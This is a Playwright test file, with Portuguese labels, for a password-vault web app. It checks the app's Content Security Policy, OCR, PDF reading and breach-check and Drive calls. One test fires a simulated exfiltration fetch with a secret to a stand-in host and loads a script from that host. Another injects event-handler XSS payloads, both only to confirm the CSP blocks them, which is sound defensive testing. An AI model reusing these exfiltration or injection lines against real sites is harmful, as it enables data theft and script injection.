import { test, expect, openApp, createVault } from './fixtures.mjs';
import { readFileSync } from 'node:fs';

const html = readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const policy = html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];

test.describe('Política de segurança (CSP)', () => {
  test('só aceita código deste site e só fala com o Drive e com a verificação de fugas', () => {
    const d = Object.fromEntries(policy.split(';').map(p => p.trim().split(/\s+/)).map(([k, ...v]) => [k, v]));
    expect(d['script-src']).not.toContain('*');
    expect(d['script-src'].filter(v => /^https?:/.test(v))).toEqual([]);
    expect(d['script-src']).not.toContain("'unsafe-eval'");
    expect(d['script-src']).not.toContain("'unsafe-inline'");
    expect(d['connect-src'].filter(v => /^https?:/.test(v)).sort()).toEqual(['https://api.pwnedpasswords.com', 'https://www.googleapis.com']);
    expect(d['object-src']).toEqual(["'none'"]);
    expect(d['base-uri']).toEqual(["'self'"]);
  });

  test('bloqueia envios para outros servidores e scripts de fora', async ({ page }) => {
    await openApp(page);
    await createVault(page);
    const r = await page.evaluate(async () => {
      let sent = true;
      try { await fetch('https://example.invalid/roubo?d=segredo', { mode: 'no-cors' }); } catch (e) { sent = false; }
      const loaded = await new Promise(res => {
        const s = document.createElement('script'); s.src = 'https://example.invalid/x.js';
        s.onload = () => res(true); s.onerror = () => res(false); document.head.appendChild(s);
      });
      let evalOk = true; try { new Function('return 1')(); } catch (e) { evalOk = false; }
      const out = { sent, loaded, evalOk, blocked: window.__csp.filter(v => v.includes('example.invalid')).length };
      return out;
    });
    expect(r).toEqual({ sent: false, loaded: false, evalOk: false, blocked: 2 });
    await page.waitForFunction(() => window.__csp.includes('script-src eval'));
    await page.evaluate(() => { window.__csp = []; }); // bloqueios provocados de propósito por este teste
  });

  test('código metido no HTML (ataque por injeção) não corre', async ({ page }) => {
    await openApp(page);
    await createVault(page);
    const ran = await page.evaluate(async () => {
      window.__pwned = 0;
      const box = document.createElement('div');
      box.innerHTML = '<img src="data:," onerror="window.__pwned++"><button id="__x" onclick="window.__pwned++">x</button>';
      document.body.appendChild(box);
      const s = document.createElement('script'); s.textContent = 'window.__pwned++'; document.head.appendChild(s);
      document.getElementById('__x').click();
      await new Promise(r => setTimeout(r, 300));
      box.remove(); s.remove();
      return window.__pwned;
    });
    expect(ran).toBe(0);
    expect(await page.evaluate(() => window.__csp.filter(v => v.startsWith('script-src')).length)).toBeGreaterThanOrEqual(3);
    await page.evaluate(() => { window.__csp = []; }); // bloqueios provocados de propósito por este teste
  });
});

test('ler a validade de uma foto (OCR) funciona só com ficheiros deste site', async ({ page }) => {
  test.setTimeout(180_000);
  await openApp(page);
  const text = await page.evaluate(async () => {
    const c = document.createElement('canvas'); c.width = 900; c.height = 220;
    const g = c.getContext('2d'); g.fillStyle = '#fff'; g.fillRect(0, 0, 900, 220);
    g.fillStyle = '#000'; g.font = 'bold 56px Arial'; g.fillText('VALIDADE 12/05/2031', 40, 130);
    return avOcrText(c.toDataURL('image/png'));
  });
  expect(text).toMatch(/12\s*\/\s*05\s*\/\s*2031/);
  expect(await page.evaluate(t => avFindExpiry(t), text)).toBe('2031-05-12');
});

test('ler o texto de um PDF funciona só com ficheiros deste site', async ({ page }) => {
  await openApp(page);
  const text = await page.evaluate(async () => {
    // PDF mínimo com uma linha de texto
    const objs = ['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 144] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
      null, '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'];
    const stream = 'BT /F1 18 Tf 20 70 Td (Fatura 2031 Aurora) Tj ET';
    objs[3] = `<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`;
    let pdf = '%PDF-1.4\n'; const offs = [];
    objs.forEach((o, i) => { offs.push(pdf.length); pdf += `${i + 1} 0 obj\n${o}\nendobj\n`; });
    const x = pdf.length;
    pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n` + offs.map(o => String(o).padStart(10, '0') + ' 00000 n \n').join('');
    pdf += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${x}\n%%EOF`;
    return avPdfText('data:application/pdf;base64,' + btoa(pdf));
  });
  expect(text).toContain('Fatura 2031 Aurora');
});

test('verificação de fugas e Google Drive continuam a funcionar com a CSP', async ({ page }) => {
  await page.route('https://api.pwnedpasswords.com/range/**', async r => {
    // SHA-1 de «password» = 5BAA6 1E4C9B93F3F0682250B6CF8331B7EE68FD8
    await r.fulfill({ status: 200, contentType: 'text/plain', body: '1E4C9B93F3F0682250B6CF8331B7EE68FD8:9545824\r\n0000000000000000000000000000000000A:1' });
  });
  await page.route('https://www.googleapis.com/drive/v3/about**', r => r.fulfill({ status: 200, contentType: 'application/json', body: '{"user":{"emailAddress":"eu@exemplo.pt"}}' }));
  await openApp(page);
  await createVault(page);
  const r = await page.evaluate(async () => {
    vault.push({ id: 'w', name: 'Conta fraca', cat: 'email', pw: 'password' });
    switchTab('vault'); renderAll();
    await checkBreaches();
    dCfg('cid', 'teste.apps.googleusercontent.com'); driveToken = 'tok'; driveTokenExp = Date.now() + 3600e3;
    const about = await (await dApi('https://www.googleapis.com/drive/v3/about?fields=user', {}, false)).json();
    return { breach: document.getElementById('breach-results').textContent, drive: about.user.emailAddress };
  });
  expect(r.breach).toContain('Conta fraca');
  expect(r.drive).toBe('eu@exemplo.pt');
});
